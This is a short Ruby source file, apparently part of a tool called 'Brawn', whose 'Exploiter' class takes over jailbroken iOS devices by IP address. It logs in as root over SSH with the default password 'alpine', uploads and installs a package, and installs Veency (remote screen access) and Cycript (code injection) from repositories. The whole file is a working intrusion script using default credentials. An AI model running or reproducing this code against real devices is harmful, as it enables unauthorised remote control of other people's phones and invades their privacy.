module Brawn
  class Exploiter
    def run(ip_addr)
      puts "Exploiting #{ip_addr}..."

      exploit_device(ip_addr)
    end

    private
    def exploit_device(ip_addr)
      puts "Attempting SSH"
      begin
        Net::SCP.upload!(ip_addr, "root", Brawn::ASSETS_DIR.join("apt7.deb").to_s, "/var/root/", :ssh => { :password => "alpine" })
        
        Net::SSH.start(ip_addr, "root", :password => "alpine", :auth_methods => ["password"], :number_of_password_prompts => 0 ) do |ssh|
          puts "SSH Session Established"
          ssh.exec!("dpkg -i apt7.deb")
          ssh.exec!("apt-get update")
          ssh.exec!("apt-get install com.conradkramer.open")
          ssh.exec!("apt-get install -y veency")
          ssh.exec!("apt-get install -y cycript")
          ssh.exec!("killall -HUP backboardd") # respring
        end
      rescue Net::SSH::AuthenticationFailed => e
        puts "Unable to SSH into #{ip_addr}. Wrong Credentials."
      rescue Net::SSH::Disconnect => e
        puts "Unable to SSH into #{ip_addr}. SSH Server not running?"
      end
    end
  end
end